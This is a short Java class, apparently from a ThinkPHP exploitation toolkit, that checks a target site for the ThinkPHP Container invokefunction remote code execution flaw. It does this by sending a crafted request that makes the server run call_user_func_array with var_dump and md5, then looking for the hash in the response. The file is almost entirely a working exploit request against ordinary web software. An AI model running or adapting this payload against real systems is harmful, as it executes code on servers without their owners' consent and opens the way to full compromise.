package com.leishianquan.thinkphpexp;

import com.leishianquan.model.BasePayload;
import com.leishianquan.util.Dialog;
import com.leishianquan.util.HttpTool;

public class container_invoke implements BasePayload {
    private static final String CheckStr="56540676a129760a";

    public boolean checkVUL(String url) throws Exception{

        try {
            String test_result =HttpTool.getHttpReuest(url + "/index.php?s=index/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=var_dump&vars[1][]=((md5(2333))", "utf-8");
            if(test_result.contains(CheckStr)){
                return true;}

        } catch (Exception e) {
//            Dialog.alert_Dialog("txf提示你",null,"连接超时");
        }
        return false;
    }
}
